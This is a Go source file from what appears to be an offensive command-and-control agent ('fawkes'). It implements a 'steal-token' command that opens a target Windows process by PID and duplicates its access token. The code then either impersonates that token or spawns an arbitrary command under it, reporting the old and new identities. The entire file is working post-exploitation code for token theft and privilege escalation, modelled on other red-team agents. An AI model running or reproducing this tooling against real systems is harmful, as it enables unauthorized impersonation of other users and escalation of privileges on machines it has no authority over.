//go:build windows
// +build windows

package commands

import (
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type StealTokenCommand struct{}

func (c *StealTokenCommand) Name() string {
	return "steal-token"
}

func (c *StealTokenCommand) Description() string {
	return "Steal and impersonate a token from another process, or spawn a process with a stolen token"
}

type StealTokenParams struct {
	PID     int    `json:"pid"`
	Action  string `json:"action"`  // "impersonate" (default) or "spawn"
	Command string `json:"command"` // Command line for spawn action
}

// Execute implements Xenon's TokenSteal function from Token.c (lines 106-183)
// and Apollo's GetSystem/StealToken from IdentityManager.cs
func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := requireParams[StealTokenParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.PID == 0 {
		return errorResult("PID is required")
	}

	// Default action is impersonate
	action := strings.ToLower(params.Action)
	if action == "" {
		action = "impersonate"
	}

	switch action {
	case "impersonate":
		return stealTokenImpersonate(params.PID)
	case "spawn":
		if params.Command == "" {
			return errorResult("command parameter is required for spawn action")
		}
		return stealTokenSpawn(params.PID, params.Command)
	default:
		return errorf("Unknown action: %s (use impersonate or spawn)", action)
	}
}

// stealTokenImpersonate is the original steal-token behavior: steal and impersonate.
func stealTokenImpersonate(pid int) structs.CommandResult {
	// Get current identity before stealing
	oldIdentity, _ := GetCurrentIdentity()

	// Revert any existing impersonation first (Xenon Token.c line 118)
	if err := RevertCurrentToken(); err != nil {
		// Log but continue
	}

	// Open target process with PROCESS_QUERY_INFORMATION
	// Try PROCESS_QUERY_INFORMATION first, fall back to PROCESS_QUERY_LIMITED_INFORMATION
	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
		if err != nil {
			return errorf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", pid, err)
		}
	}
	defer windows.CloseHandle(hProcess)

	// Open process token
	var hToken windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
	if err != nil {
		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
		if err != nil {
			return errorf("OpenProcessToken failed for PID %d: %v", pid, err)
		}
	}

	// Get target identity for output
	targetIdentity, _ := GetTokenUserInfo(hToken)

	// Impersonate using the primary token first
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
	if ret == 0 {
		hToken.Close()
		return errorf("ImpersonateLoggedOnUser failed: %v", err)
	}

	// Duplicate the token for storage
	var duplicatedToken windows.Token
	err = windows.DuplicateTokenEx(
		hToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&duplicatedToken,
	)
	if err != nil {
		err = windows.DuplicateTokenEx(
			hToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityImpersonation,
			windows.TokenImpersonation,
			&duplicatedToken,
		)
		if err != nil {
			hToken.Close()
			procRevertToSelf.Call()
			return errorf("DuplicateTokenEx failed: %v", err)
		}
	}

	hToken.Close()

	// Impersonate with the duplicated token
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(duplicatedToken))
	if ret == 0 {
		windows.CloseHandle(windows.Handle(duplicatedToken))
		procRevertToSelf.Call()
		return errorf("ImpersonateLoggedOnUser (duplicated token) failed: %v", err)
	}

	// Store the duplicated token in global state
	tokenMutex.Lock()
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
	}
	gIdentityToken = duplicatedToken
	tokenMutex.Unlock()

	// Verify impersonation
	newIdentity, err := GetCurrentIdentity()
	if err != nil {
		return errorf("Token stolen but failed to verify identity: %v", err)
	}

	// Record identity transition for history
	RecordIdentityTransition("stealtoken", oldIdentity, newIdentity,
		fmt.Sprintf("PID %d", pid))

	var output string
	if targetIdentity != "" {
		output = fmt.Sprintf("Stole token from PID %d (%s)\n", pid, targetIdentity)
	} else {
		output = fmt.Sprintf("Stole token from PID %d\n", pid)
	}
	if oldIdentity != "" {
		output += fmt.Sprintf("Old: %s\n", oldIdentity)
	}
	output += fmt.Sprintf("New: %s", newIdentity)

	return successResult(output)
}

// stealTokenSpawn steals a token from a process and uses it to spawn a new process.
// The token is not stored for impersonation — the spawned process runs independently
// under the stolen token's security context.
func stealTokenSpawn(pid int, cmdLine string) structs.CommandResult {
	// Open target process
	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
		if err != nil {
			return errorf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", pid, err)
		}
	}
	defer windows.CloseHandle(hProcess)

	// Open process token
	var hToken windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
	if err != nil {
		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
		if err != nil {
			return errorf("OpenProcessToken failed for PID %d: %v", pid, err)
		}
	}
	defer hToken.Close()

	// Duplicate to a primary token for CreateProcessWithTokenW
	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(
		hToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&primaryToken,
	)
	if err != nil {
		// Fallback: try with SecurityImpersonation
		err = windows.DuplicateTokenEx(
			hToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityImpersonation,
			windows.TokenPrimary,
			&primaryToken,
		)
		if err != nil {
			return errorf("DuplicateTokenEx failed: %v", err)
		}
	}
	defer windows.CloseHandle(windows.Handle(primaryToken))

	// Spawn process with the stolen token
	result, err := spawnWithToken(primaryToken, cmdLine)
	if err != nil {
		return errorf("Failed to spawn process: %v", err)
	}

	output := fmt.Sprintf("Spawned process with stolen token from PID %d\n", pid)
	if result.Identity != "" {
		output += fmt.Sprintf("Token identity: %s\n", result.Identity)
	}
	output += fmt.Sprintf("New PID: %d\n", result.PID)
	output += fmt.Sprintf("Command: %s", cmdLine)

	return successResult(output)
}

// ExecuteWithAgent implements the AgentCommand interface
func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

// Helper to manually open process token with specific access
func openProcessTokenWithAccess(hProcess windows.Handle, access uint32) (windows.Token, error) {
	var token windows.Token
	ret, _, err := procOpenProcessToken.Call(
		uintptr(hProcess),
		uintptr(access),
		uintptr(unsafe.Pointer(&token)),
	)
	if ret == 0 {
		return 0, err
	}
	return token, nil
}
